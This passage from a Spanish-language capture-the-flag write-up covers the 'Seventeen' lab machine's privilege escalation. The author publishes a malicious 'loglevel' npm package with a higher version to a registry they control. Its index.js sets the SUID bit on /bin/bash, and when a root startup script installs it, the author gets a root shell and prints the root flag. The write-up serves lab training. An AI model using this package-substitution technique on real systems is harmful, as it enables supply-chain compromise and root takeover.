    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep --silent
        /bin/chown root:root node_modules -R
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"

/usr/bin/node /opt/app/index.js
```

Y la versión la ```1.8.0```

```null
kavi@seventeen:/dev/shm$ npm install loglevel
/dev/shm
└── loglevel@1.8.0 

npm WARN enoent ENOENT: no such file or directory, open '/dev/shm/package.json'
npm WARN shm No description
npm WARN shm No repository field.
npm WARN shm No README data
npm WARN shm No license field.
```

Al crear el módulo le indico la versión ```1.8.1```

```null
npm init
This utility will walk you through creating a package.json file.
It only covers the most common items, and tries to guess sensible defaults.

See `npm help init` for definitive documentation on these fields
and exactly what they do.

Use `npm install <pkg>` afterwards to install a package and
save it as a dependency in the package.json file.

Press ^C at any time to quit.
package name: (seventeen) loglevel
version: (1.0.0) 1.8.1
description: 
entry point: (index.js) 
test command: 
git repository: 
keywords: 
author: 
license: (ISC) 
About to write to /home/rubbx/Desktop/HTB/Machines/Seventeen/package.json:

{
  "name": "loglevel",
  "version": "1.8.1",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC"
}


Is this OK? (yes) 
```

Creo un archivo ```index.js``` que le asigne el SUID a la bash

```null
require("child_process").exec("chmod u+s /bin/bash")
```

Utilizo ```verdaccio``` como demonio de ```node.js``` a través de un contenedor

```null
docker run -it --rm -p 4873:4873 verdaccio/verdaccio
Unable to find image 'verdaccio/verdaccio:latest' locally
latest: Pulling from verdaccio/verdaccio
f56be85fc22e: Pull complete 
931b0e865bc2: Pull complete 
60542df8b663: Pull complete 
062e26bc2446: Pull complete 
a08145a3ccc5: Pull complete 
ed01328a487b: Pull complete 
405f21289d4f: Pull complete 
6ddb6bd86143: Pull complete 
24e36e55210c: Pull complete 
801d9798ae23: Pull complete 
522c27429617: Pull complete 
5b17772661ce: Pull complete 
Digest: sha256:07f6d56e846cc207f7a5e792472b990d6f4728b157b115de2ff0e9dcc52ce337
Status: Downloaded newer image for verdaccio/verdaccio:latest
 info --- config file  - /verdaccio/conf/config.yaml
 info --- the "crypt" algorithm is deprecated consider switch to "bcrypt" in the configuration file. Read the documentation for additional details
 info --- using htpasswd file: /verdaccio/storage/htpasswd
 info --- plugin successfully loaded: verdaccio-htpasswd
 info --- plugin successfully loaded: verdaccio-audit
 warn --- http address - http://0.0.0.0:4873/ - verdaccio/5.25.0
```

Me loggeo en este

```null
npm adduser --registry http://10.10.16.6:4873 --auth-type=legacy
npm notice Log in on http://10.10.16.6:4873/
Username: rubbx
Password: 
Email: (this IS public) rubbx@rubbx.com
Logged in on http://10.10.16.6:4873/.
```

Y lo comparto

```null
npm publish --registry http://10.10.16.6:4873
```

Instalo la nueva versión

```null
kavi@seventeen:/$ sudo /opt/app/startup.sh
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@1.8.2 
└── mysql@2.18.1 

[+] Starting the app
/opt/app/index.js:26
        logger.log("INFO:  Server running on port " + port)
               ^

TypeError: logger.log is not a function
    at Server.<anonymous> (/opt/app/index.js:26:16)
    at Object.onceWrapper (events.js:313:30)
    at emitNone (events.js:106:13)
    at Server.emit (events.js:208:7)
    at emitListeningNT (net.js:1394:10)
    at _combinedTickCallback (internal/process/next_tick.js:135:11)
    at process._tickCallback (internal/process/next_tick.js:180:9)
    at Function.Module.runMain (module.js:695:11)
    at startup (bootstrap_node.js:188:16)
    at bootstrap_node.js:609:3
```

La bash pasa a ser SUID y puedo ver la segunda flag

```null
kavi@seventeen:/$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
kavi@seventeen:/$ bash -p
bash-4.4# cat /root/root.txt
9c0f585c22931d90c4fe8b6872bfacf4
```